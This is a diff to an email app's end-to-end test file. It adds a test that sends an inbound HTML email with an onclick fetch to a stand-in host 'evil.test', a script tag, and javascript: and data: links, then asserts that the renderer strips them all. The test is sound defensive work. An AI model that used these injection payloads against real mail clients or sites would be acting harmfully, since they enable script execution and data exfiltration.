@@ -28,7 +28,7 @@ mirroring `test_mail_client_full_roundtrip`'s send+receive-in-one-function shape
 
 ⚠ This test deliberately uses a REAL send (outbound) and a REAL inbound SMTP
 delivery (inbound), NOT the linux mock-backend inject seam: that seam
-(`apps/fauna-linux/src/main.rs` `inject_inbound_..._for_test`) hard-codes the
+(`apps/fauna-linux/src/lib.rs` `inject_inbound_..._for_test`) hard-codes the
 mail rail to `BodyFormat::PlainText`, so it cannot exercise the HTML→markdown
 path at all. Only a real inbound message flows through `inbound_mail_body`.
 
@@ -40,8 +40,10 @@ import time
 
 import pytest
 
-from helpers.app_surface import skip_unbuilt
+from helpers.app_surface import require_surface
+from helpers.budgets import UI_SETTLE_S
 from helpers.mail_client_ui import claim_enable_and_ready, deliver_inbound
+from helpers.waiting import wait_until
 
 # `real_conversations`: a native app (windows, macOS/iOS) starts the REAL shared-Rust
 # `ConversationsSession` receive loop only under `FAUNA_E2E_REAL_CONVERSATIONS`
@@ -65,15 +67,7 @@ def test_html_mail_markdown_roundtrip(app, unclaimed_mail_nest_ui):
     text/html part; receive a real text/html email → rendered as formatted
     markdown (not raw tags). The two halves prove the bidirectional
     markdown-interchange feature on the lead app."""
-    if not (app.driver.is_linux() or app.driver.is_macos() or app.driver.is_ios()):
-        skip_unbuilt(
-            app.driver,
-            surface="the HTML-mail markdown round-trip (render + compose toolbar)",
-            detail="wired on linux first (the lead client whose render + "
-            "compose toolbar are verified working); the other apps are the "
-            "cross-app follow-on",
-            tracked="mail-settings.md",
-        )
+    require_surface(app.driver, "html-mail-markdown-roundtrip")
 
     nest = unclaimed_mail_nest_ui
     ctx = claim_enable_and_ready(app, nest, credential_kind="oauthbearer")
@@ -189,18 +183,23 @@ def test_html_mail_markdown_roundtrip(app, unclaimed_mail_nest_ui):
     # markers are stripped by the renderer (message_bubble Markdown arm). A
     # PlainText/Html stamp would instead show raw tags or literal markers.
     app.conversations.open_thread_for_sender(in_nonce)
-    n = app.driver.count("dm-message-text")
-    assert n >= 1, "no message bubble rendered in the opened inbound thread"
-    rendered = None
-    for i in range(n):
-        t = app.driver.get_text("dm-message-text", index=i) or ""
-        if in_nonce in t:
-            rendered = t
-            break
-    assert rendered is not None, (
-        f"the inbound message body carrying {in_nonce!r} did not render in any "
-        f"dm-message-text bubble; bubbles: "
-        f"{[app.driver.get_text('dm-message-text', index=i) for i in range(n)]!r}"
+
+    def _bubbles():
+        return [
+            app.driver.get_text("dm-message-text", index=i) or ""
+            for i in range(app.driver.count("dm-message-text"))
+        ]
+
+    # Wait on the bubble carrying the nonce, not on the first read after the
+    # open: web paints the thread's bubbles before their bodies settle
+    # (convention 14).
+    rendered = wait_until(
+        lambda: next((t for t in _bubbles() if in_nonce in t), None),
+        UI_SETTLE_S,
+        diagnose=lambda: (
+            f"the inbound message body carrying {in_nonce!r} did not render in "
+            f"any dm-message-text bubble; bubbles: {_bubbles()!r}"
+        ),
     )
     assert "<strong>" not in rendered and "<p>" not in rendered, (
         f"inbound HTML rendered as RAW TAGS — inbound_mail_body did not convert "
@@ -243,26 +242,7 @@ def test_html_mail_remote_image_blocked_until_reveal(app, unclaimed_mail_nest_ui
     the linux mock inject seam (which hard-codes PlainText — see the module
     docstring), so the HTML→markdown image path actually runs.
     """
-    if not (
-        app.driver.is_linux() or app.driver.is_windows()
-        or app.driver.is_macos() or app.driver.is_ios()
-    ):
-        # macos/ios shipped the shared-FaunaKit render (MarkdownBodyView /
-        # DmMessageBubble). The apple mail-enable gaps this gate used to cite
-        # (macOS enable-toggle crash; iOS settings-subpage nav) are dated
-        # 2026-06-13 and `mail-settings.md` § Implementation status today now
-        # records the apple mail-enable path fixed 2026-07-13 with the
-        # dedicated-mail-nest tier_3 family green on `--client macos` —
-        # re-verify with a real run before trusting the old comment.
-        skip_unbuilt(
-            app.driver,
-            surface="html-mail inline-image render",
-            detail="landed on linux (lead, sets the "
-            "placeholder + reveal-button shape) + windows; macos/ios shipped the "
-            "render but are blocked upstream by apple mail-enable gaps (see comment "
-            "above); web + android are the cross-area follow-on work",
-            tracked="mail-settings.md",
-        )
+    require_surface(app.driver, "html-mail-inline-image")
 
     nest = unclaimed_mail_nest_ui
     ctx = claim_enable_and_ready(app, nest, credential_kind="oauthbearer")
@@ -341,3 +321,76 @@ def test_html_mail_remote_image_blocked_until_reveal(app, unclaimed_mail_nest_ui
         f"clear — the button is still present (count={after_count}); the reveal "
         f"did not flip the message to fetch mode"
     )
+
+
+@pytest.mark.feature("email-in-conversations")
+def test_html_mail_scripts_never_run_and_active_links_are_removed(
+    app, unclaimed_mail_nest_ui
+):
+    """`docs/goal/behavior/html-mail.md` § Security & privacy — conversion is the
+    perimeter: an inbound HTML mail's ``<script>`` (and its text), its event
+    handlers, and the destinations of its ``javascript:`` / ``data:`` links never
+    reach the bubble; the links' words stay, beside an ``https`` link's (the
+    control, so a bubble that dropped everything cannot pass).
+
+    "Never runs" is observed as "never reaches the app": the app renders only the
+    markdown `html_markdown::inbound_mail_body` produced, so a script it was
+    never given cannot run, and the bubble's own text shows what it was given.
+    REAL inbound SMTP delivery, as the module docstring requires.
+    """
+    nest = unclaimed_mail_nest_ui
+    ctx = claim_enable_and_ready(app, nest, credential_kind="oauthbearer")
+    domain = ctx["domain"]
+    handle = ctx["handle"]
+
+    nonce = f"htmlsafe{int(time.time() * 1000)}qx"
+    script_text = f"stolen{nonce}"
+    inbound = (
+        "\r\n".join([
+            f"From: Erin <erin@{EXTERNAL_DOMAIN}>",
+            f"To: {handle}",
+            f"Subject: HTML scripts {nonce}",
+            f"Message-ID: <{nonce}@{EXTERNAL_DOMAIN}>",
+            "Date: Mon, 08 Jun 2026 12:00:00 +0000",
+            "MIME-Version: 1.0",
+            "Content-Type: text/html; charset=utf-8",
+            "",
+            f"<p onclick=\"fetch('https://evil.test/{script_text}')\">Hello {nonce}</p>"
+            f"<script>document.title='{script_text}';</script>"
+            f"<p><a href=\"javascript:alert('{script_text}')\">click jsword</a> "
+            f"<a href=\"data:text/html;base64,PHNjcmlwdD4=\">open dataword</a> "
+            f"<a href=\"https://safe.test/{nonce}\">safeword</a></p>",
+        ]) + "\r\n"
+    ).encode()
+    deliver_inbound(
+        nest.mx_port, domain, f"erin@{EXTERNAL_DOMAIN}", handle, inbound,
+        time.monotonic() + 40.0,
+    )
+
+    wait_until(
+        lambda: any(
+            nonce in (t.label or "") or nonce in (t.snippet or "")
+            for t in app.conversations.list_threads()
+        ),
+        60.0,
+        diagnose=lambda: f"the inbound text/html email {nonce!r} never surfaced; "
+        f"threads: {[(t.label, t.snippet) for t in app.conversations.list_threads()]}; "
+        f"error: {app.error_text()!r}; {nest.bridge_log_hint()}",
+    )
+    app.conversations.open_thread_for_sender(nonce)
+    body = wait_until(
+        lambda: next(
+            (t for t in app.driver.get_texts("dm-message-text") if f"Hello {nonce}" in t),
+            None,
+        ),
+        UI_SETTLE_S,
+        diagnose=lambda: f"no bubble carries the mail's text; bubbles: "
+        f"{app.driver.get_texts('dm-message-text')!r}; error: {app.error_text()!r}",
+    )
+    for word in ("jsword", "dataword", "safeword"):
+        assert word in body, f"a link's words stay in the bubble ({word!r}): {body!r}"
+    for banned in (script_text, "javascript:", "data:text/html", "onclick", "<script"):
+        assert banned not in body, (
+            f"{banned!r} reached the bubble — the HTML→markdown perimeter let "
+            f"active content through: {body!r}"
+        )
